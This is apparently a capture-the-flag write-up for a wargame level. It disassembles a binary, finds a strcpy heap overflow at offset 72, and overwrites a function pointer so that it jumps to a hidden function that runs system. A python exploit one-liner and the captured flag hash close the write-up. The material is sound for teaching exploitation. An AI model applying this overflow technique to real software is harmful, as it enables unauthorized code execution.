# Level6

    (gdb) disas main
    Dump of assembler code for function main:
        0x0804847c <+0>:	push   %ebp
        0x0804847d <+1>:	mov    %esp,%ebp
        0x0804847f <+3>:	and    $0xfffffff0,%esp
        0x08048482 <+6>:	sub    $0x20,%esp
        0x08048485 <+9>:	movl   $0x40,(%esp)
        0x0804848c <+16>:	call   0x8048350 <malloc@plt>
        0x08048491 <+21>:	mov    %eax,0x1c(%esp)
        0x08048495 <+25>:	movl   $0x4,(%esp)
        0x0804849c <+32>:	call   0x8048350 <malloc@plt>
        0x080484a1 <+37>:	mov    %eax,0x18(%esp)
        0x080484a5 <+41>:	mov    $0x8048468,%edx
        0x080484aa <+46>:	mov    0x18(%esp),%eax
        0x080484ae <+50>:	mov    %edx,(%eax)
        0x080484b0 <+52>:	mov    0xc(%ebp),%eax
        0x080484b3 <+55>:	add    $0x4,%eax
        0x080484b6 <+58>:	mov    (%eax),%eax
        0x080484b8 <+60>:	mov    %eax,%edx
        0x080484ba <+62>:	mov    0x1c(%esp),%eax
        0x080484be <+66>:	mov    %edx,0x4(%esp)
        0x080484c2 <+70>:	mov    %eax,(%esp)
        0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
        0x080484ca <+78>:	mov    0x18(%esp),%eax
        0x080484ce <+82>:	mov    (%eax),%eax
        0x080484d0 <+84>:	call   *%eax
        0x080484d2 <+86>:	leave  
        0x080484d3 <+87>:	ret    
    End of assembler dump.
    (gdb) disas m
    Dump of assembler code for function m:
        0x08048468 <+0>:	push   %ebp
        0x08048469 <+1>:	mov    %esp,%ebp
        0x0804846b <+3>:	sub    $0x18,%esp
        0x0804846e <+6>:	movl   $0x80485d1,(%esp)
        0x08048475 <+13>:	call   0x8048360 <puts@plt>
        0x0804847a <+18>:	leave  
        0x0804847b <+19>:	ret    
    End of assembler dump.

This binary will write "nope" when ran with any argument.

Once again, an unused function : 

    (gdb) disas n
    Dump of assembler code for function n:
        0x08048454 <+0>:	push   %ebp
        0x08048455 <+1>:	mov    %esp,%ebp
        0x08048457 <+3>:	sub    $0x18,%esp
        0x0804845a <+6>:	movl   $0x80485b0,(%esp)
        0x08048461 <+13>:	call   0x8048370 <system@plt>
        0x08048466 <+18>:	leave  
        0x08048467 <+19>:	ret    
    End of assembler dump.

It will... you guessed it... display the PASSWORD

Let's first check if we can overflow strcpy (of course we can)

	$ msf-pattern_create -l100 > payload
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

    (gdb) run < payload 
    Starting program: /home/user/level6/level6 < payload

    Program received signal SIGSEGV, Segmentation fault.
    0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
    (gdb) i r
    eax            0x804a008	134520840
    ecx            0x0	0
    edx            0x804a008	134520840
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff70c	0xbffff70c
    ebp            0xbffff738	0xbffff738
    esi            0x0	0
    edi            0x0	0
    eip            0xb7eb8aa8	0xb7eb8aa8 <--
    eflags         0x210296	[ PF AF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

It seems to segfault without overflowing any register. In fact, it appears that passing any file will cause a segfault. We need to pass the arguments directly as a string.

    (gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Starting program: /home/user/level6/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

    Program received signal SIGSEGV, Segmentation fault.
    0x41346341 in ?? ()
    (gdb) i r
    eax            0x41346341	1093952321 <-- A4cA
    ecx            0xbffff900	-1073743616
    edx            0x804a064	134520932
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff69c	0xbffff69c
    ebp            0xbffff6c8	0xbffff6c8
    esi            0x0	0
    edi            0x0	0
    eip            0x41346341	0x41346341 <-- A4cA
    eflags         0x210202	[ IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

    $ msf-pattern_offset -q Ac4A
    [*] Exact match at offset 72

We can overflow EIP with the 73-76th characters. Let's pass the address of the n function after padding :

    ./level6 $(python -c 'print "Y"*72 + "\x54\x84\x04\x08"')
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
